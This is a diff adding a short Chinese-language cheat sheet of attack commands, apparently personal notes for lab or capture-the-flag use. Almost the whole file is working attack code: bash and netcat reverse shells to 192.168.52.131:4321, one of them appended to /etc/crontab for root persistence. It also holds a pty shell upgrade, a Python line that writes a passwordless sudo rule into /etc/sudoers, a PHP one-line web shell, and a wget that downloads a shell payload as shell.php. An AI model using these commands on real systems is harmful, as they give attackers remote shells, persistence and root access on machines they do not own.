@@ -1,0 +1,25 @@
+使用前先打开nc监听端口
+/bin/bash -i >& /dev/tcp/kaili的ip/监听端口 0>&1
+
+在.sh文件中可直接添加
+bash -c "bash -i >& /dev/tcp/192.168.52.131/4321 0>&1"
+
+命令行中 echo "/bin/bash -i >& /dev/tcp/192.168.52.131/4321 0>&1" >> 需要追加的文件路径（一般在etc/crontab)提权到root
+
+将shell转化成正常交互界面
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+寻找自动执行文件
+find / -name cronlog 2>dev/null
+
+将用户权限提升（在本地的python文件)
+os.system('echo "用户名 ALL=（ALL)NOPASSWD: ALL" >> /etc/sudoers')
+
+一句话shell
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.52.131/4321 0>&1'"); ?>
+
+注意在文件泄露漏洞是如果需要架设反弹shell需要下载txt并转为Php并在当前目录下/shell.php重新刷新打开
+wget http://192.168.52.131/shell.txt -O shell.php 
+
+如果有安装有nc也可以在自动启动的/etc/crontab添加
+nc -e /bin/bash/ 192.168.52.131 4321
